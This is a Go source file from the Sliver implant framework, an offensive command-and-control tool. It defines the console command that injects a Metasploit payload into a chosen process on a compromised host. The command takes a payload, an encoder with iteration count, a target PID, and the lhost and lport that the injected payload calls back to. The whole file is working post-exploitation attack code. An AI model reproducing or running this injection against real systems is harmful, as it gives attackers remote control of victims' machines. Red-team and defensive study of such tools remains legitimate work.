package exec

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"

	"github.com/bishopfox/sliver/client/console"
	consts "github.com/bishopfox/sliver/client/constants"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"

	"github.com/desertbit/grumble"
)

// MsfInjectCmd - Inject a metasploit payload into a remote process
func MsfInjectCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	session := con.ActiveTarget.GetSessionInteractive()
	if session == nil {
		return
	}

	payloadName := ctx.Flags.String("payload")
	lhost := ctx.Flags.String("lhost")
	lport := ctx.Flags.Int("lport")
	encoder := ctx.Flags.String("encoder")
	iterations := ctx.Flags.Int("iterations")
	pid := ctx.Flags.Int("pid")

	if lhost == "" {
		con.PrintErrorf("Invalid lhost '%s', see `help %s`\n", lhost, consts.MsfInjectStr)
		return
	}

	if pid == -1 {
		con.PrintErrorf("Invalid pid '%s', see `help %s`\n", lhost, consts.MsfInjectStr)
		return
	}

	ctrl := make(chan bool)
	msg := fmt.Sprintf("Injecting payload %s %s/%s -> %s:%d ...",
		payloadName, session.OS, session.Arch, lhost, lport)
	con.SpinUntil(msg, ctrl)
	msfTask, err := con.Rpc.MsfRemote(context.Background(), &clientpb.MSFRemoteReq{
		Request:    con.ActiveTarget.Request(ctx),
		Payload:    payloadName,
		LHost:      lhost,
		LPort:      uint32(lport),
		Encoder:    encoder,
		Iterations: int32(iterations),
		PID:        uint32(pid),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	if msfTask.Response != nil && msfTask.Response.Async {
		con.AddBeaconCallback(msfTask.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, msfTask)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}
			PrintMsfRemote(msfTask, con)
		})
		con.PrintAsyncResponse(msfTask.Response)
	} else {
		PrintMsfRemote(msfTask, con)
	}
}

func PrintMsfRemote(msfRemote *sliverpb.Task, con *console.SliverConsoleClient) {

}
